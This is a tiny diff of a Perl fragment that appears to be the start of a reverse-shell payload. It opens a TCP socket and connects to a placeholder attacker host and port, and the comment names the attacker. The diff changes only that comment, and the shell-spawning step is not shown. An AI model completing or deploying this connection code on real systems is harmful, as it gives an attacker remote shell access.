@@ -1,6 +1,6 @@
 use Socket;
 
-# Open a new socket and connect to the attacker
+# Open a new TCP socket and connect to the attacker
 socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
 connect(S, sockaddr_in(*\port*, inet_aton("*\host*")))
 
